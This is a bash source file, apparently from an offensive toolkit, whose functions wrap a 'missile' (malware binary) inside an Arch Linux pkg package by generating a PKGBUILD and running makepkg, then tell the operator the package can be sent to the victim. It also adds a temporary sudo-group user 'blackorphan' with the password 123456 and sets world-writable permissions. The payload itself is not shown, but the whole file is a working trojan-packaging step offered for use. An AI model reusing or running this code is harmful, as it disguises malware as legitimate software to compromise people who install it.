# Packger for pkg packages
_pkgbuild(){
    while read line
    do
	$line
    done << EOF > PKGBUILD
echo # Maintainer: Your Name <${email}>
echo pkgname=${fileName}
echo pkgver=${vnumber}
echo pkgrel=1
echo pkgdir=/usr/local/bin
echo pkgdesc="${description}"
echo arch=('any')
echo license=('GPL')
echo source=("\$pkgname-\$pkgver.tar.gz")
EOF
}

createMalPkg() {
    while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" "${pPackage}" ; \
	  read $opt -e inmissile
    do
	case $inmissile in
	    y|Y)
		
		malwareDir="malware"
		
		mkdir "${malwareDir}"
		cd "$_"
		chmod -R 777 "../${malwareDir}"
		chk_file;
		packagedetails
		mkdir "${fileName}-${vnumber}"
		mv "${fileName}" "$_"
		tar -cvf "${fileName}-${vnumber}.tar.gz" "${fileName}-${vnumber}"
		rm -rf "${fileName}-${vnumber}"
		_pkgbuild
		chmod 777 PKGBUILD
		
		[[ "$(whoami)" == "root" ]] && \
		    printf "\n\a${open}${bold}${red}[!]I cannot Package If you are root${close}\n" && \
		    {
			while printf "${open}${light}${green}%s: ${close}" "specify a user to package with"; read myUser junk
			do

			    [[ -z "${myUser}" ]] && myUser=blackorphan && \
				printf "\n${open}${bold}${green}Creating user blackorpahn...${close}\n" && \
				useradd -G sudo -s /bin/bash --password 123456 "${myUser}"
				
				break
			    if grep ^"$myUser" < /etc/passwd ;then
				break
			    fi
			    printf "\n${open}${bold}${red}Invalid User has been specified\n"
			    continue			    
			done
			
			
			
		    }
		
		: ${myUser:=$(whoami)}
		[[ "$(which bsdtar)" ]] || {
		    printf "${open}${bold}${red}[!]bsdtar is not installed on your BoX${close}\n" && \
			printf "${open}${bold}${yellow}[!]Trying to install bsdtar${close}" && \
			>/dev/tcp/google.com/80
		    [[ $? != 0 ]] && \
			echo "${open}${light}${red}Please Check Your internet Conectivity or install bsdtar mannually${close}" && {
			    [[ "${myUser}" == "blackorphan" ]] && {
				userdel "${myUser}"
				exit 2
			    }
			    
			    exit 2
			}
		}
		
		gksu -u "${myUser}" "${CRYPT}/misc/makepkg -g >> PKGBUILD"
		
		[[ $? != 0 ]] && printf "\n\n${open}${bold}${red}Fatal Error..Exiting${close}\n" && exit 2
		gksu -u ${myUser} "../misc/makepkg"
		[[ $? != 0 ]] && printf "\n\n${open}${bold}${red}Fatal Error..Exiting${close}\n" && exit 2
		
		[[ "${myUser}" == "blackorphan" ]] && \
		    
		    echo "${open}${bold}${green}Removing User BlackOrphan${close}" && \
		    
		    userdel "${myUser}"
		
		cp ./*.pkg.* "../"
		rm -rf "../${malwareDir}"
		
		printf "${open}${light}${green}Ok we are done here..${close}\n"
		printf "${open}${light}${green}You can now send the package to your victim${close}\n"

		echo ""
		box3d
		break
		exit
		;;
	    
	    n|N)
		shit_func ;;
	    
	    *)
		printf "${open}${bold}${red}%s${close}" "Invalid response"
		;;
	esac
    done
}
